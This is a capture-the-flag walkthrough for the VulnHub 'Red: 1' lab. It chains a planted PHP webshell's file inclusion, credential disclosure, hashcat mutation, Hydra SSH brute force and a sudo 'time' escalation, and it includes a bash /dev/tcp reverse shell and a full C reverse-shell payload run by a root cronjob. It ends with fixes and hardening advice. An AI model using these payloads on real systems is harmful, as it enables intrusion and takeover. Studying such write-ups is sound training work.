@@ -1,0 +1,591 @@
+================================================================================
+Red: 1 CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/red-1,753/
+================================================================================
+
+OBJECTIVE  : Regain control of the compromised system — capture root flag
+DIFFICULTY : Intermediate
+KEYWORDS   : LFI, PHP Wrapper, Hashcat Rules, SSH Brute Force, GTFOBins, Cronjob
+TARGET IP  : 10.0.2.21
+NOTE       : Add "10.0.2.21 redrocks.win" to /etc/hosts before starting
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Network scan
+nmap -sV -Pn -sC 10.0.2.21
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-04
+Nmap scan report for redrocks.win (10.0.2.21)
+Host is up (0.0013s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
+|_http-generator: WordPress 5.8.1
+|_http-title: Hacked By Red
+
+# Robots.txt
+curl http://10.0.2.21/robots.txt
+
+User-agent: *
+Disallow: /wp-admin/
+Allow: /wp-admin/admin-ajax.php
+Sitemap: http://redrocks.win/wp-sitemap.xml
+
+# Key observations
+- WordPress 5.8.1 installed
+- Site has been defaced by "Red"
+- Only ports 22 and 80 are open
+- Primary attack surface: web server
+
+================================================================================
+[2] WEB DIRECTORY ENUMERATION
+================================================================================
+
+# Search for planted PHP webshells using a backdoor-specific wordlist
+locate CommonBackdoors
+# Path: /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-PHP.fuzz.txt
+
+gobuster dir -u http://10.0.2.21/ \
+  -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-PHP.fuzz.txt
+
+===============================================================
+Gobuster v3.8.2
+===============================================================
+NetworkFileManagerPHP.php (Status: 500) [Size: 0]
+===============================================================
+
+# Critical finding
+A known PHP webshell was discovered: NetworkFileManagerPHP.php
+Source: https://github.com/BlackArch/webshells/blob/master/php/NetworkFileManagerPHP.php
+Red is using this as an LFI (Local File Inclusion) backdoor.
+
+================================================================================
+[3] LFI PARAMETER DISCOVERY
+================================================================================
+
+# Wordlist for LFI parameter fuzzing
+# https://github.com/whiteknight7/wordlist/blob/main/fuzz-lfi-params-list.txt
+
+wfuzz -u "http://10.0.2.21/NetworkFileManagerPHP.php?FUZZ=/etc/passwd" \
+  -w fuzz-lfi-params-list.txt --hw 0
+
+=====================================================================
+ID           Response   Lines    Word    Chars    Payload
+=====================================================================
+000000027:   200        38 L     53 W    1966 W   "key"
+
+# Vulnerable parameter found: "key"
+# LFI endpoint: http://redrocks.win/NetworkFileManagerPHP.php?key=
+
+================================================================================
+[4] LFI EXPLOITATION - READING SYSTEM FILES
+================================================================================
+
+# Read /etc/passwd
+curl http://redrocks.win/NetworkFileManagerPHP.php?key=../../../etc/passwd
+
+[Output]
+root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:john:/home/john:/bin/bash
+ippsec:x:1001:1001:,,,:/home/ippsec:/bin/bash
+oxdf:x:1002:1002:,,,:/home/oxdf:/bin/bash
+mysql:x:113:117:MySQL Server...:/nonexistent:/bin/false
+[... other system users ...]
+
+# Key users with bash shells:
+#   john   (uid 1000)
+#   ippsec (uid 1001)
+#   oxdf   (uid 1002)
+
+================================================================================
+[5] SOURCE CODE DISCLOSURE VIA PHP FILTER WRAPPER
+================================================================================
+
+# Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md
+
+# Extract wp-config.php via base64 PHP filter
+curl "http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=wp-config.php" \
+  > wpc_base64.txt
+
+base64 -d wpc_base64.txt
+
+[Relevant decoded output]
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'john' );
+define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );
+define( 'DB_HOST', 'localhost' );
+define('WP_SITEURL', 'http://redrocks.win');
+
+# Credentials found:
+#   DB_USER     : john
+#   DB_PASSWORD : R3v_m4lwh3r3_k1nG!!
+
+================================================================================
+[6] HIDDEN HINT IN BACKDOOR SOURCE CODE
+================================================================================
+
+# Extract the backdoor's own PHP source
+curl "http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php" \
+  > nfm_base64.txt
+
+base64 -d nfm_base64.txt
+
+[Decoded PHP source]
+<?php
+   $file = $_GET['key'];
+   if(isset($file))
+   {
+       include("$file");
+   }
+   else
+   {
+       include("NetworkFileManagerPHP.php");
+   }
+   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */
+?>
+
+# Decode the hidden base64 comment
+echo "VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw==" | base64 -d
+
+[Output]
+That password alone won't help you! Hashcat says rules are rules
+
+# KEY INSIGHT: The wp-config.php password must be mutated using Hashcat rules.
+
+================================================================================
+[7] PASSWORD MUTATION WITH HASHCAT
+================================================================================
+
+# Save base password
+echo 'R3v_m4lwh3r3_k1nG!!' > passwd.txt
+
+# Generate mutated wordlist using best66.rule
+hashcat --force passwd.txt -r /usr/share/hashcat/rules/best66.rule --stdout > wordlist.txt
+
+ls -l wordlist.txt
+# -rw-rw-r-- 1 root root 1268 May 4 10:43 wordlist.txt
+
+# wordlist.txt now contains 66 password mutations of the base password
+# (e.g. R3v_m4lwh3r3_k1nG!!21, r3v_m4lwh3r3_k1nG!!, R3V_M4LWH3R3_K1NG!!, etc.)
+
+================================================================================
+[8] SSH BRUTE FORCE WITH HYDRA
+================================================================================
+
+# We know:
+#   - Port 22 is open
+#   - Username: john (from /etc/passwd and wp-config.php)
+#   - Password is a mutation of R3v_m4lwh3r3_k1nG!!
+
+hydra -l john -P wordlist.txt 10.0.2.21 ssh
+
+[Result]
+[22][ssh] host: 10.0.2.21   login: john   password: R3v_m4lwh3r3_k1nG!!21
+
+# WARNING: Red has a defense mechanism in place:
+#   - change_pass.sh  : Changes john's password every ~5 minutes
+#   - kill_sess.sh    : Kills active SSH sessions
+#   - talk.sh         : Sends taunting messages to terminal
+#
+# If kicked out, run Hydra again to get the updated password.
+
+hydra -l john -P wordlist.txt 10.0.2.21 ssh
+[22][ssh] host: 10.0.2.21   login: john   password: r3v_m4lwh3r3_k1nG!!
+
+================================================================================
+[9] INITIAL SSH ACCESS AS JOHN
+================================================================================
+
+ssh john@10.0.2.21
+# Password: (whichever Hydra found)
+
+john@red:~$ whoami
+john
+john@red:~$ ls
+note_from_red.txt
+john@red:~$ head note_from_red.txt
+Having a little trouble with the cat command blue?
+
+# NOTE: Red has replaced or broken the "cat" command.
+# Use "head" or "tac" to read files instead.
+
+================================================================================
+[10] SUDO ENUMERATION AND LATERAL MOVEMENT
+================================================================================
+
+john@red:~$ sudo -l
+
+Matching Defaults entries for john on red:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User john may run the following commands on red:
+    (ippsec) NOPASSWD: /usr/bin/time
+
+# GTFOBins exploitation: /usr/bin/time can spawn a shell
+# https://gtfobins.github.io/gtfobins/time/
+
+john@red:~$ sudo -u ippsec /usr/bin/time /bin/bash
+
+ippsec@red:/home/john$ whoami
+ippsec
+ippsec@red:/home/john$ cd ~
+ippsec@red:~$ ls
+user.txt
+ippsec@red:~$ head user.txt
+Fake Flag:
+Come on now Blue! You really think it would be that easy to get the user flag?
+You are not even on the right user! Hahaha
+
+# This is a decoy. Continue escalating.
+
+================================================================================
+[11] ESTABLISHING PERSISTENT REVERSE SHELL
+================================================================================
+
+# Since the password changes every ~5 minutes, we need persistence.
+# Create a reverse shell script on the target before getting kicked.
+
+ippsec@red:/home/john$ cd /dev/shm
+ippsec@red:/dev/shm$ nano shell.sh
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.0.2.6/4444 0>&1
+
+ippsec@red:/dev/shm$ chmod +x shell.sh
+
+# On attacker machine — start listener:
+rlwrap nc -nvlp 4444
+
+# On target — execute:
+ippsec@red:/dev/shm$ bash shell.sh
+
+# Shell received:
+listening on [any] 4444 ...
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.21] 54750
+ippsec@red:/dev/shm$
+
+# Stabilize shell
+export TERM=xterm
+
+================================================================================
+[12] DISCOVERY OF PRIVILEGED .GIT DIRECTORY
+================================================================================
+
+ippsec@red:/dev/shm$ cd /var/www/wordpress
+ippsec@red:/var/www/wordpress$ ls -la
+
+total 236
+drwxr-xr-x  6 www-data www-data  4096 Oct 31 2021 .
+drwxr-xr-x  4 root     root      4096 Oct 24 2021 ..
+drwxrwx---  2 root     ippsec    4096 May  4 15:22 .git   <-- WRITABLE BY ippsec!
+[... wordpress files ...]
+
+# The .git directory is owned by root but writable by group ippsec.
+# A privileged cronjob monitors this directory and compiles/executes C files.
+
+ippsec@red:/var/www/wordpress$ cd .git
+ippsec@red:/var/www/wordpress/.git$ ls
+rev  supersecretfileuc.c
+
+# Read Red's C file (tac because cat is broken):
+tac supersecretfileuc.c
+
+}
+    return 0;
+    printf("Get out of here Blue!\n");
+    // prints hello world
+{
+int main()
+#include <stdio.h>
+
+# This is a placeholder. We replace it with our own reverse shell.
+
+================================================================================
+[13] ROOT EXPLOITATION VIA CRONJOB + MALICIOUS C FILE
+================================================================================
+
+# Step 1: Remove Red's files
+ippsec@red:/var/www/wordpress/.git$ rm -rf supersecretfileuc.c
+ippsec@red:/var/www/wordpress/.git$ rm -r rev
+
+# Step 2: Create reverse shell C payload on ATTACKER machine
+nano supersecretfileuc.c
+
+--- BEGIN FILE ---
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+   int port = 9001;
+   struct sockaddr_in revsockaddr;
+
+   int sockt = socket(AF_INET, SOCK_STREAM, 0);
+   revsockaddr.sin_family = AF_INET;
+   revsockaddr.sin_port = htons(port);
+   revsockaddr.sin_addr.s_addr = inet_addr("10.0.2.6");
+
+   connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
+   dup2(sockt, 0);
+   dup2(sockt, 1);
+   dup2(sockt, 2);
+
+   char * const argv[] = {"/bin/bash", NULL};
+   execve("/bin/bash", argv, NULL);
+
+   return 0;
+}
+--- END FILE ---
+
+# Step 3: Host file via Python HTTP server on attacker machine
+python3 -m http.server --bind=10.0.2.6 8001
+
+# Step 4: Download file to target
+# (From the ippsec reverse shell)
+wget http://10.0.2.6:8001/supersecretfileuc.c -P /var/www/wordpress/.git/
+
+# Step 5: Start root listener on attacker machine
+rlwrap nc -nvlp 9001
+
+# Wait for Red's cronjob to compile and execute the file...
+
+================================================================================
+[14] ROOT SHELL RECEIVED
+================================================================================
+
+listening on [any] 9001 ...
+connect to [10.0.2.6] from (UNKNOWN) [10.0.2.21] 57492
+
+whoami
+root
+
+ls /root
+defense  root.txt  snap
+
+head /root/root.txt
+GG Blue, GG
+
+# ROOT FLAG CAPTURED
+
+================================================================================
+[15] RED'S DEFENSE SYSTEM ANALYSIS
+================================================================================
+
+ls /root/defense
+backdoor.sh   change_pass.sh   kill_sess.sh   talk.sh
+
+# Breakdown:
+# backdoor.sh    - Sets up and maintains Red's persistence
+# change_pass.sh - Periodically rotates john's SSH password
+# kill_sess.sh   - Kills all active SSH sessions
+# talk.sh        - Sends taunting messages to connected terminals
+
+# This explains:
+#   - Why we were logged out after SSH login
+#   - Why the password changed between Hydra runs
+#   - Why "cat" and similar commands behaved unexpectedly
+
+================================================================================
+[16] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap Port Scan (22/tcp SSH, 80/tcp HTTP)
+    |
+    v
+Gobuster — CommonBackdoors-PHP wordlist
+    |
+    v
+NetworkFileManagerPHP.php discovered (Status 500)
+    |
+    v
+wfuzz LFI parameter fuzzing → parameter: "key"
+    |
+    v
+LFI: /etc/passwd read → users: john, ippsec, oxdf
+    |
+    v
+PHP Filter Wrapper → wp-config.php decoded
+    |
+    v
+Credentials: john / R3v_m4lwh3r3_k1nG!!
+    |
+    v
+PHP Filter Wrapper → NetworkFileManagerPHP.php decoded
+    |
+    v
+Hidden Base64 hint: "Hashcat says rules are rules"
+    |
+    v
+Hashcat best66.rule → 66 password mutations generated
+    |
+    v
+Hydra SSH brute force → john / R3v_m4lwh3r3_k1nG!!21
+    |
+    v
+SSH Login as john (watch for kick-out timer)
+    |
+    v
+sudo -l → (ippsec) NOPASSWD: /usr/bin/time
+    |
+    v
+GTFOBins time exploit → shell as ippsec
+    |
+    v
+/dev/shm/shell.sh → persistent reverse shell as ippsec
+    |
+    v
+/var/www/wordpress/.git → writable by ippsec
+    |
+    v
+supersecretfileuc.c replaced with C reverse shell payload
+    |
+    v
+wget payload from attacker HTTP server
+    |
+    v
+Root cronjob compiles and executes payload
+    |
+    v
+Root shell received on nc listener port 9001
+    |
+    v
+root.txt: "GG Blue, GG" — SYSTEM PWNED
+
+================================================================================
+[17] VULNERABILITIES IDENTIFIED
+================================================================================
+
+1. PLANTED PHP WEBSHELL (Critical)
+   File     : /var/www/wordpress/NetworkFileManagerPHP.php
+   Impact   : LFI enabling arbitrary file read
+   Fix      : File integrity monitoring; audit web root for unauthorized files
+
+2. LOCAL FILE INCLUSION — UNSANITIZED include() (Critical)
+   Code     : include($_GET['key']);
+   Impact   : Read of /etc/passwd, wp-config.php, PHP source files
+   Fix      : Allowlist permitted paths; disable allow_url_include in php.ini
+
+3. CREDENTIAL REUSE — wp-config.php → SSH (High)
+   Detail   : DB password (mutated) also valid for SSH login
+   Fix      : Unique credentials per service; enforce SSH key-only auth
+
+4. SUDO MISCONFIGURATION — /usr/bin/time (High)
+   Entry    : (ippsec) NOPASSWD: /usr/bin/time
+   Impact   : Shell as ippsec via: sudo -u ippsec /usr/bin/time /bin/bash
+   Fix      : Audit sudoers; avoid NOPASSWD for GTFOBins-exploitable binaries
+
+5. WRITABLE .git + PRIVILEGED CRONJOB (Critical)
+   Detail   : /var/www/wordpress/.git writable by ippsec; root cronjob compiles C files there
+   Impact   : Root privilege escalation via malicious C payload
+   Fix      : Restrict .git permissions; verify cronjob privilege levels
+
+================================================================================
+[18] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. SSH Hardening
+   - Disable password auth: PasswordAuthentication no (in /etc/ssh/sshd_config)
+   - Enforce SSH key-based authentication only
+   - Deploy fail2ban to block brute-force attempts
+
+2. PHP / Web Application
+   - Disable dangerous PHP functions in php.ini:
+       disable_functions = system,exec,shell_exec,passthru,proc_open,popen
+       allow_url_include = Off
+       allow_url_fopen = Off
+   - Never pass raw user input to include() or require()
+   - Implement Web Application Firewall (WAF)
+
+3. Credential Management
+   - Use unique, randomly generated passwords per service
+   - Never store credentials in web-readable config files without additional protection
+   - Implement secrets management (HashiCorp Vault, AWS Secrets Manager)
+
+4. Filesystem & Cronjob Security
+   - Apply principle of least privilege to all cron-monitored directories
+   - Audit all crontabs: crontab -l, /etc/cron.d/, /etc/crontab
+   - Implement file integrity monitoring (AIDE, Tripwire) on sensitive paths
+
+5. Sudo Policy
+   - Run regular sudo audits across all users
+   - Avoid NOPASSWD for any binary listed on GTFOBins
+   - Grant only specific, necessary commands with fixed arguments
+
+6. Incident Response
+   - Audit all running processes and crontabs immediately on compromise
+   - Look for defense scripts in /root or hidden directories
+   - Check for modified system binaries (cat, ls, etc.)
+
+================================================================================
+[19] TOOLS USED
+================================================================================
+
+Reconnaissance:
+  nmap       - Network and service scanning
+
+Enumeration:
+  gobuster   - Directory and backdoor enumeration
+  wfuzz      - LFI parameter fuzzing
+  curl       - HTTP file retrieval and testing
+
+Password Attacks:
+  hashcat    - Password mutation with best66.rule
+  hydra      - SSH brute force
+
+Exploitation:
+  nc/rlwrap  - Reverse shell listener
+  python3    - HTTP server for payload delivery
+  bash/C     - Reverse shell payloads
+
+References:
+  GTFOBins   - https://gtfobins.github.io/gtfobins/time/
+  PayloadsAllTheThings - LFI Wrappers
+  BlackArch webshells  - NetworkFileManagerPHP.php
+
+================================================================================
+[20] REFERENCES
+================================================================================
+
+VulnHub:
+  Red: 1 VM  : https://www.vulnhub.com/entry/red-1,753/
+
+Webshell Source:
+  https://github.com/BlackArch/webshells/blob/master/php/NetworkFileManagerPHP.php
+
+LFI Wrappers:
+  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md
+
+LFI Wordlist:
+  https://github.com/whiteknight7/wordlist/blob/main/fuzz-lfi-params-list.txt
+
+GTFOBins time:
+  https://gtfobins.github.io/gtfobins/time/
+
+Hashcat Rules:
+  https://hashcat.net/wiki/doku.php?id=rule_based_attack
+
+OWASP LFI:
+  https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+
+================================================================================
+[21] DISCLAIMER
+================================================================================
+
+This writeup is for educational and training purposes only. All techniques
+demonstrated should only be used on systems you own or have explicit written
+permission to test. Unauthorized access to computer systems is illegal and
+may result in criminal prosecution.
+
+The author and VulnHub are not responsible for any misuse of the information
+provided in this writeup. This content is intended to help security
+professionals learn and practice ethical hacking in controlled environments.
+
+================================================================================
